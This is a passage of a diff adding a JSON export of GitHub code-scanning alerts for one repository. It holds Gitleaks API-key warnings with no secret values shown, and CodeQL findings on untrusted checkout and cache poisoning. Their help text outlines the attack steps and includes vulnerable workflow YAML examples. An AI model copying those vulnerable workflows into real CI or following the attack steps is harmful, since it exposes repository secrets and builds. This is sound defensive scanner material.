+    "text": "generic-api-key has detected secret for file vectors/sapling/sapling_note_encryption.json at commit 9ea2d4c5c1932b04adbba858ae381a8504ab3f39."
+   },
+   "location": {
+    "path": "vectors/sapling/sapling_note_encryption.json",
+    "start_line": 77,
+    "end_line": 77,
+    "start_column": 6,
+    "end_column": 87
+   },
+   "classifications": []
+  },
+  "instances_url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/7/instances",
+  "dismissal_approved_by": null,
+  "assignees": [],
+  "linked_pull_requests": [],
+  "linked_issues": []
+ },
+ {
+  "number": 6,
+  "created_at": "2026-10-23T06:16:29Z",
+  "updated_at": "2026-10-23T06:16:29Z",
+  "url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/6",
+  "html_url": "https://github.com/boyfromcave/x402-ycash/security/code-scanning/6",
+  "state": "open",
+  "fixed_at": null,
+  "dismissed_by": null,
+  "dismissed_at": null,
+  "dismissed_reason": null,
+  "dismissed_comment": null,
+  "rule": {
+   "id": "generic-api-key",
+   "severity": "warning",
+   "description": "Detected a Generic API Key, potentially exposing access to various services and sensitive operations.",
+   "name": "",
+   "tags": [],
+   "full_description": "",
+   "help": ""
+  },
+  "tool": {
+   "name": "Gitleaks",
+   "guid": null,
+   "version": "v8.0.0"
+  },
+  "most_recent_instance": {
+   "ref": "refs/heads/upgrade/vault",
+   "analysis_key": ".github/workflows/secops.yml:gitleaks",
+   "environment": "{}",
+   "category": "gitleaks",
+   "state": "open",
+   "commit_sha": "5b76da203bcb087429abc9c3c1a46ae5be7cf9c7",
+   "message": {
+    "text": "generic-api-key has detected secret for file vectors/sapling/sapling_note_encryption.json at commit 9ea2d4c5c1932b04adbba858ae381a8504ab3f39."
+   },
+   "location": {
+    "path": "vectors/sapling/sapling_note_encryption.json",
+    "start_line": 57,
+    "end_line": 57,
+    "start_column": 6,
+    "end_column": 87
+   },
+   "classifications": []
+  },
+  "instances_url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/6/instances",
+  "dismissal_approved_by": null,
+  "assignees": [],
+  "linked_pull_requests": [],
+  "linked_issues": []
+ },
+ {
+  "number": 5,
+  "created_at": "2026-10-23T06:16:29Z",
+  "updated_at": "2026-10-23T06:16:29Z",
+  "url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/5",
+  "html_url": "https://github.com/boyfromcave/x402-ycash/security/code-scanning/5",
+  "state": "open",
+  "fixed_at": null,
+  "dismissed_by": null,
+  "dismissed_at": null,
+  "dismissed_reason": null,
+  "dismissed_comment": null,
+  "rule": {
+   "id": "generic-api-key",
+   "severity": "warning",
+   "description": "Detected a Generic API Key, potentially exposing access to various services and sensitive operations.",
+   "name": "",
+   "tags": [],
+   "full_description": "",
+   "help": ""
+  },
+  "tool": {
+   "name": "Gitleaks",
+   "guid": null,
+   "version": "v8.0.0"
+  },
+  "most_recent_instance": {
+   "ref": "refs/heads/upgrade/vault",
+   "analysis_key": ".github/workflows/secops.yml:gitleaks",
+   "environment": "{}",
+   "category": "gitleaks",
+   "state": "open",
+   "commit_sha": "5b76da203bcb087429abc9c3c1a46ae5be7cf9c7",
+   "message": {
+    "text": "generic-api-key has detected secret for file vectors/sapling/sapling_note_encryption.json at commit 9ea2d4c5c1932b04adbba858ae381a8504ab3f39."
+   },
+   "location": {
+    "path": "vectors/sapling/sapling_note_encryption.json",
+    "start_line": 37,
+    "end_line": 37,
+    "start_column": 6,
+    "end_column": 87
+   },
+   "classifications": []
+  },
+  "instances_url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/5/instances",
+  "dismissal_approved_by": null,
+  "assignees": [],
+  "linked_pull_requests": [],
+  "linked_issues": []
+ },
+ {
+  "number": 4,
+  "created_at": "2026-10-23T06:16:29Z",
+  "updated_at": "2026-10-23T06:16:29Z",
+  "url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/4",
+  "html_url": "https://github.com/boyfromcave/x402-ycash/security/code-scanning/4",
+  "state": "open",
+  "fixed_at": null,
+  "dismissed_by": null,
+  "dismissed_at": null,
+  "dismissed_reason": null,
+  "dismissed_comment": null,
+  "rule": {
+   "id": "generic-api-key",
+   "severity": "warning",
+   "description": "Detected a Generic API Key, potentially exposing access to various services and sensitive operations.",
+   "name": "",
+   "tags": [],
+   "full_description": "",
+   "help": ""
+  },
+  "tool": {
+   "name": "Gitleaks",
+   "guid": null,
+   "version": "v8.0.0"
+  },
+  "most_recent_instance": {
+   "ref": "refs/heads/upgrade/vault",
+   "analysis_key": ".github/workflows/secops.yml:gitleaks",
+   "environment": "{}",
+   "category": "gitleaks",
+   "state": "open",
+   "commit_sha": "5b76da203bcb087429abc9c3c1a46ae5be7cf9c7",
+   "message": {
+    "text": "generic-api-key has detected secret for file vectors/sapling/sapling_note_encryption.json at commit 9ea2d4c5c1932b04adbba858ae381a8504ab3f39."
+   },
+   "location": {
+    "path": "vectors/sapling/sapling_note_encryption.json",
+    "start_line": 17,
+    "end_line": 17,
+    "start_column": 6,
+    "end_column": 87
+   },
+   "classifications": []
+  },
+  "instances_url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/4/instances",
+  "dismissal_approved_by": null,
+  "assignees": [],
+  "linked_pull_requests": [],
+  "linked_issues": []
+ },
+ {
+  "number": 3,
+  "created_at": "2026-10-23T06:12:22Z",
+  "updated_at": "2026-10-23T06:12:22Z",
+  "url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/3",
+  "html_url": "https://github.com/boyfromcave/x402-ycash/security/code-scanning/3",
+  "state": "open",
+  "fixed_at": null,
+  "dismissed_by": null,
+  "dismissed_at": null,
+  "dismissed_reason": null,
+  "dismissed_comment": null,
+  "rule": {
+   "id": "actions/untrusted-checkout/medium",
+   "severity": "warning",
+   "description": "Checkout of untrusted code in a non-privileged context",
+   "name": "actions/untrusted-checkout/medium",
+   "tags": [
+    "actions",
+    "external/cwe/cwe-829",
+    "security"
+   ],
+   "full_description": "Checking out and running the build script from a fork executes untrusted code. Even in a non-privileged workflow, this can be abused, for example to compromise self-hosted runners or to poison caches and artifacts that are later consumed by privileged workflows.",
+   "help": "## Overview\n\nGitHub workflows can be triggered through various repository events, including incoming pull requests (PRs) or comments on Issues/PRs. Under certain conditions described below, attackers can take over a repository by opening malicious PRs from forks. The attacks can result in malicious code execution causing unauthorized changes to the repository or exfiltration of repository secrets and a compromise of connected systems.\n\n## Workflow Security Model\n\nIn GitHub Actions, there is a distinction between unprivileged and privileged workflows. For example, a workflow with a `pull_request` trigger is unprivileged while a workflow with `pull_request_target` is privileged.\n\nThis is relevant especially for PRs from forks. Normal PRs can only be submitted by people who have write access to a repository, while PRs from forks can be submitted by anyone.\n\nOn a PR from a fork, an unprivileged `pull_request` workflow has only limited capabilities but a privileged `pull_request_target` workflow is much more dangerous. A privileged workflow:\n\n  * Runs in the context of the base repository\n  * Has access to organization and repository secrets (e.g., API keys, deployment tokens)\n  * Has a read/write `GITHUB_TOKEN` by default\n  * Can access private resources\n\nCertain triggers automatically grant a workflow elevated privileges:\n\n  * `pull_request_target` as described above\n  * `workflow_run`: Triggered when another workflow completes.\n  * `issue_comment`: Triggered when a comment is made on an issue or PR.\n\n## Attack Details\n\n  * A repository has a privileged workflow\n  * An attacker forks the repository and adds malicious code (e.g., in the build script)\n  * The attacker opens a PR from the fork, and, if needed, comments on the PR\n  * The workflow in the base repository checks out the forked code\n  * The workflow runs the malicious code\n\nPlease note that not only build scripts can be malicious code vectors. There is a large number of other possibilities. Some of them are listed in the [LOTP](https://boostsecurityio.github.io/lotp/) catalog.\n\n## Recommendation\n\n- Avoid using `pull_request_target` unless necessary.\n- Employ unprivileged `pull_request` workflows followed by `workflow_run` for privileged operations.\n- Use labels like `safe to test` to vet PRs and manage the execution context appropriately.\n\nThe best practice is to handle the potentially untrusted pull request via the **pull_request** trigger so that it is isolated in an unprivileged environment. The workflow processing the pull request should then store any results like code coverage or failed/passed tests in artifacts and exit. A second privileged workflow with the access to repository secrets, triggered by the completion of the first workflow using `workflow_run` trigger event, downloads the artifacts and make any necessary modifications to the repository or interact with third party services that require repository secrets (e.g. API tokens).\n\nThe artifacts downloaded from the first workflow should be considered untrusted and must be verified.\n\nAdditionally, ensure that least privilege are used both at the workflow level (through event triggers and workflow permissions) and job level (through job permissions).\n\n## Example\n\n### Incorrect Usage\n\nThe following workflow checks-out untrusted code in a privileged context and runs user-controlled code (in this case package.json scripts) which will grant privileged access to the attacker:\n\n```yaml\non: pull_request_target\n\njobs:\n  build:\n    name: Build and test\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v2\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n\n      - uses: actions/setup-node@v1\n      - run: |\n          npm install # scripts in package.json from PR would be executed here\n          npm build\n\n      - uses: completely/fakeaction@v2\n        with:\n          arg1: ${{ secrets.supersecret }}\n\n      - uses: fakerepo/comment-on-pr@v1\n        with:\n          message: |\n            Thank you!\n```\n\n### Correct Usage\n\nAn example shows how to use two workflows: one for processing the untrusted PR and the other for using the results in a safe context.\n\n**ReceivePR.yml** (untrusted PR handling with artifact creation):\n\n```yaml\nname: Receive PR\non:\n  pull_request:\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v2\n      - name: Build\n        run: /bin/bash ./build.sh\n      - name: Save PR number\n        run: |\n          mkdir -p ./pr\n          echo ${{ github.event.number }} > ./pr/NR\n      - uses: actions/upload-artifact@v2\n        with:\n          name: pr\n          path: pr/\n```\n\n**CommentPR.yml** (processing artifacts with privileged access):\n\n```yaml\nname: Comment on the pull request\non:\n  workflow_run:\n    workflows: [\"Receive PR\"]\n    types:\n      - completed\njobs:\n  upload:\n    runs-on: ubuntu-latest\n    if: >\n      github.event.workflow_run.event == 'pull_request' &&\n      github.event.workflow_run.conclusion == 'success'\n    steps:\n      - name: \"Download artifact\"\n        uses: actions/github-script@v3.1.0\n        with:\n          script: |\n            var artifacts = await github.actions.listWorkflowRunArtifacts({\n                owner: context.repo.owner,\n                repo: context.repo.repo,\n                run_id: ${{github.event.workflow_run.id }},\n            });\n            var matchArtifact = artifacts.data.artifacts.filter((artifact) => {\n              return artifact.name == \"pr\";\n            })[0];\n            var download = await github.actions.downloadArtifact({\n                owner: context.repo.owner,\n                repo: context.repo.repo,\n                artifact_id: matchArtifact.id,\n                archive_format: 'zip',\n            });\n            var fs = require('fs');\n            fs.writeFileSync('${{github.workspace}}/pr.zip', Buffer.from(download.data));\n      - run: |\n          mkdir -p tmp\n          unzip -d tmp/ pr.zip\n      - name: \"Comment on PR\"\n        uses: actions/github-script@v3\n        with:\n          github-token: ${{ secrets.GITHUB_TOKEN }}\n          script: |\n            var fs = require('fs');\n            var issue_number = Number(fs.readFileSync('./tmp/NR'));\n            // Verify that the file contains a numeric value\n            const contains_numeric = /\\d/.test(issue_number);\n            if (contains_numeric) {\n                await github.issues.createComment({\n                  owner: context.repo.owner,\n                  repo: context.repo.repo,\n                  issue_number: issue_number,\n                  body: 'Everything is OK. Thank you for the PR!'\n                });\n            }\n```\n\n## References\n\n- GitHub Security Lab Research: [Keeping your GitHub Actions and workflows secure Part 1: Preventing pwn requests](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/).\n- Mitigating risks of untrusted checkout: [GitHub Docs](https://docs.github.com/en/enterprise-cloud@latest/actions/reference/security/secure-use#mitigating-the-risks-of-untrusted-code-checkout).\n- Securing with least privilege: [Workflow secure use](https://docs.github.com/en/actions/reference/security/secure-use).\n- Living Off the Pipeline: [LOTP](https://boostsecurityio.github.io/lotp/).\n",
+   "security_severity_level": "medium"
+  },
+  "tool": {
+   "name": "CodeQL",
+   "guid": null,
+   "version": "2.27.3"
+  },
+  "most_recent_instance": {
+   "ref": "refs/heads/upgrade/vault",
+   "analysis_key": ".github/workflows/codeql.yml:analyze",
+   "environment": "{\"language\":\"actions\"}",
+   "category": "codeql-actions",
+   "state": "open",
+   "commit_sha": "5b76da203bcb087429abc9c3c1a46ae5be7cf9c7",
+   "message": {
+    "text": "Potential unsafe checkout of untrusted pull request on non-privileged workflow."
+   },
+   "location": {
+    "path": ".github/workflows/ci.yml",
+    "start_line": 185,
+    "end_line": 191,
+    "start_column": 9,
+    "end_column": 7
+   },
+   "classifications": []
+  },
+  "instances_url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/3/instances",
+  "dismissal_approved_by": null,
+  "assignees": [],
+  "linked_pull_requests": [],
+  "linked_issues": []
+ },
+ {
+  "number": 2,
+  "created_at": "2026-10-23T06:12:22Z",
+  "updated_at": "2026-10-23T06:12:22Z",
+  "url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/2",
+  "html_url": "https://github.com/boyfromcave/x402-ycash/security/code-scanning/2",
+  "state": "open",
+  "fixed_at": null,
+  "dismissed_by": null,
+  "dismissed_at": null,
+  "dismissed_reason": null,
+  "dismissed_comment": null,
+  "rule": {
+   "id": "actions/cache-poisoning/poisonable-step",
+   "severity": "error",
+   "description": "Cache Poisoning via execution of untrusted code",
+   "name": "actions/cache-poisoning/poisonable-step",
+   "tags": [
+    "actions",
+    "external/cwe/cwe-349",
+    "security"
+   ],
+   "full_description": "The cache can be poisoned by untrusted code, leading to a cache poisoning attack.",
+   "help": "## Overview\n\nGitHub Actions cache poisoning is a technique that allows an attacker to inject malicious content into the Action's cache from unprivileged workflow, potentially leading to code execution in privileged workflows.\n\nAn attacker with the ability to run code in the context of the default branch (e.g. through Code Injection or Execution of Untrusted Code) can exploit this to:\n\n1. Steal the cache access token and URL.\n2. Overflow the cache to trigger eviction of legitimate entries.\n3. Poison cache entries with malicious payloads.\n4. Achieve code execution in privileged workflows that restore the poisoned cache.\n\nThis allows lateral movement from low-privileged to high-privileged workflows within a repository.\n\n### Cache Structure\n\nIn GitHub Actions, cache scopes are primarily determined by the branch structure. Branches are considered the main security boundary for GitHub Actions caching. This means that cache entries are generally scoped to specific branches.\n\n- **Access to Parent Branch Caches**: Feature branches (or child branches) created off of a parent branch (like `main` or `dev`) can access caches from the parent branch. For instance, a feature branch off of `main` will be able to access the cache from `main`.\n\n- **Sibling Branches**: Sibling branches, meaning branches that are created from the same parent but not from each other, do not share caches. For example, two branches created off of `main` will not be able to access each other\u2019s caches directly.\n\nDue to the above design, if something is cached in the context of the default branch (e.g., `main`), it becomes accessible to any feature branch derived from `main`.\n\n## Recommendation\n\n1. Avoid using caching in workflows that handle sensitive operations like releases.\n2. If caching must be used:\n   - Validate restored cache contents before use.\n   - Use short-lived, workflow-specific cache keys.\n   - Clear caches regularly.\n3. Implement strict isolation between untrusted and privileged workflow execution.\n4. Never run untrusted code in the context of the default branch.\n5. Sign the cache value cryptographically and verify the signature before usage.\n\n## Example\n\nGitHub gives workflows triggered by low-trust events, such as `issue_comment`,\n`pull_request_target`, and `workflow_run`, read-only access to the default branch cache scope.\nThis query therefore reports only workflows whose trigger can write to that scope.\n\n### Incorrect Usage\n\nThe following write-capable manually dispatched workflow fetches an unvalidated revision and then\nexecutes code from it. The executed code can use the cache token to poison the default branch cache\nif an untrusted integration or automation can influence the dispatch input.\n\n```yaml\nname: Vulnerable Workflow\non:\n  workflow_dispatch:\n    inputs:\n      head_sha:\n        required: true\njobs:\n  test:\n    permissions: {}\n    runs-on: ubuntu-latest\n    steps:\n      - env:\n          HEAD_SHA: ${{ github.event.inputs.head_sha }}\n        run: |\n          git fetch origin \"$HEAD_SHA\"\n          git checkout \"$HEAD_SHA\"\n      - name: Run tests\n        run: npm install\n```\n\n### Correct Usage\n\nThe following workflow runs untrusted code in a non-privileged job and the cache is scoped to the Pull Request branch.\n\n```yaml\nname: Secure Workflow\non:\n  pull_request:\n    branches: [main]\npermissions: {}\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v3\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n      - name: Run tests\n        run: ./run_tests.sh\n```\n\n## References\n\n- Adnan Khan's Blog: [The Monsters in Your Build Cache \u2013 GitHub Actions Cache Poisoning](https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/).\n- GitHub Docs: [Cache access for low-trust workflow triggers](https://docs.github.com/actions/reference/workflows-and-actions/dependency-caching#cache-access-for-low-trust-workflow-triggers).\n- Scribe Security Blog: [Cache Poisoning in GitHub Actions](https://scribesecurity.com/blog/github-cache-poisoning/).\n",
+   "security_severity_level": "high"
+  },
+  "tool": {
+   "name": "CodeQL",
+   "guid": null,
+   "version": "2.27.3"
+  },
+  "most_recent_instance": {
+   "ref": "refs/heads/upgrade/vault",
+   "analysis_key": ".github/workflows/codeql.yml:analyze",
+   "environment": "{\"language\":\"actions\"}",
+   "category": "codeql-actions",
+   "state": "open",
+   "commit_sha": "5b76da203bcb087429abc9c3c1a46ae5be7cf9c7",
+   "message": {
+    "text": "Potential cache poisoning in the context of the default branch due to privilege checkout of untrusted code from steps.node.outputs.branch. (workflow_dispatch)."
+   },
+   "location": {
+    "path": ".github/workflows/ci.yml",
+    "start_line": 237,
+    "end_line": 239,
+    "start_column": 9,
+    "end_column": 7
+   },
+   "classifications": []
+  },
+  "instances_url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/2/instances",
+  "dismissal_approved_by": null,
+  "assignees": [],
+  "linked_pull_requests": [],
+  "linked_issues": []
+ },
+ {
+  "number": 1,
+  "created_at": "2026-10-23T06:12:22Z",
+  "updated_at": "2026-10-23T06:12:22Z",
+  "url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/1",
+  "html_url": "https://github.com/boyfromcave/x402-ycash/security/code-scanning/1",
+  "state": "open",
+  "fixed_at": null,
+  "dismissed_by": null,
+  "dismissed_at": null,
+  "dismissed_reason": null,
+  "dismissed_comment": null,
+  "rule": {
+   "id": "actions/cache-poisoning/poisonable-step",
+   "severity": "error",
+   "description": "Cache Poisoning via execution of untrusted code",
+   "name": "actions/cache-poisoning/poisonable-step",
+   "tags": [
+    "actions",
+    "external/cwe/cwe-349",
+    "security"
+   ],
+   "full_description": "The cache can be poisoned by untrusted code, leading to a cache poisoning attack.",
+   "help": "## Overview\n\nGitHub Actions cache poisoning is a technique that allows an attacker to inject malicious content into the Action's cache from unprivileged workflow, potentially leading to code execution in privileged workflows.\n\nAn attacker with the ability to run code in the context of the default branch (e.g. through Code Injection or Execution of Untrusted Code) can exploit this to:\n\n1. Steal the cache access token and URL.\n2. Overflow the cache to trigger eviction of legitimate entries.\n3. Poison cache entries with malicious payloads.\n4. Achieve code execution in privileged workflows that restore the poisoned cache.\n\nThis allows lateral movement from low-privileged to high-privileged workflows within a repository.\n\n### Cache Structure\n\nIn GitHub Actions, cache scopes are primarily determined by the branch structure. Branches are considered the main security boundary for GitHub Actions caching. This means that cache entries are generally scoped to specific branches.\n\n- **Access to Parent Branch Caches**: Feature branches (or child branches) created off of a parent branch (like `main` or `dev`) can access caches from the parent branch. For instance, a feature branch off of `main` will be able to access the cache from `main`.\n\n- **Sibling Branches**: Sibling branches, meaning branches that are created from the same parent but not from each other, do not share caches. For example, two branches created off of `main` will not be able to access each other\u2019s caches directly.\n\nDue to the above design, if something is cached in the context of the default branch (e.g., `main`), it becomes accessible to any feature branch derived from `main`.\n\n## Recommendation\n\n1. Avoid using caching in workflows that handle sensitive operations like releases.\n2. If caching must be used:\n   - Validate restored cache contents before use.\n   - Use short-lived, workflow-specific cache keys.\n   - Clear caches regularly.\n3. Implement strict isolation between untrusted and privileged workflow execution.\n4. Never run untrusted code in the context of the default branch.\n5. Sign the cache value cryptographically and verify the signature before usage.\n\n## Example\n\nGitHub gives workflows triggered by low-trust events, such as `issue_comment`,\n`pull_request_target`, and `workflow_run`, read-only access to the default branch cache scope.\nThis query therefore reports only workflows whose trigger can write to that scope.\n\n### Incorrect Usage\n\nThe following write-capable manually dispatched workflow fetches an unvalidated revision and then\nexecutes code from it. The executed code can use the cache token to poison the default branch cache\nif an untrusted integration or automation can influence the dispatch input.\n\n```yaml\nname: Vulnerable Workflow\non:\n  workflow_dispatch:\n    inputs:\n      head_sha:\n        required: true\njobs:\n  test:\n    permissions: {}\n    runs-on: ubuntu-latest\n    steps:\n      - env:\n          HEAD_SHA: ${{ github.event.inputs.head_sha }}\n        run: |\n          git fetch origin \"$HEAD_SHA\"\n          git checkout \"$HEAD_SHA\"\n      - name: Run tests\n        run: npm install\n```\n\n### Correct Usage\n\nThe following workflow runs untrusted code in a non-privileged job and the cache is scoped to the Pull Request branch.\n\n```yaml\nname: Secure Workflow\non:\n  pull_request:\n    branches: [main]\npermissions: {}\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v3\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n      - name: Run tests\n        run: ./run_tests.sh\n```\n\n## References\n\n- Adnan Khan's Blog: [The Monsters in Your Build Cache \u2013 GitHub Actions Cache Poisoning](https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/).\n- GitHub Docs: [Cache access for low-trust workflow triggers](https://docs.github.com/actions/reference/workflows-and-actions/dependency-caching#cache-access-for-low-trust-workflow-triggers).\n- Scribe Security Blog: [Cache Poisoning in GitHub Actions](https://scribesecurity.com/blog/github-cache-poisoning/).\n",
+   "security_severity_level": "high"
+  },
+  "tool": {
+   "name": "CodeQL",
+   "guid": null,
+   "version": "2.27.3"
+  },
+  "most_recent_instance": {
+   "ref": "refs/heads/upgrade/vault",
+   "analysis_key": ".github/workflows/codeql.yml:analyze",
+   "environment": "{\"language\":\"actions\"}",
+   "category": "codeql-actions",
+   "state": "open",
+   "commit_sha": "5b76da203bcb087429abc9c3c1a46ae5be7cf9c7",
+   "message": {
+    "text": "Potential cache poisoning in the context of the default branch due to privilege checkout of untrusted code from steps.node.outputs.branch. (workflow_dispatch)."
+   },
+   "location": {
+    "path": ".github/workflows/ci.yml",
+    "start_line": 225,
+    "end_line": 232,
+    "start_column": 9,
+    "end_column": 7
+   },
+   "classifications": []
+  },
+  "instances_url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/1/instances",
+  "dismissal_approved_by": null,
+  "assignees": [],
+  "linked_pull_requests": [],
+  "linked_issues": []
+ }
+]
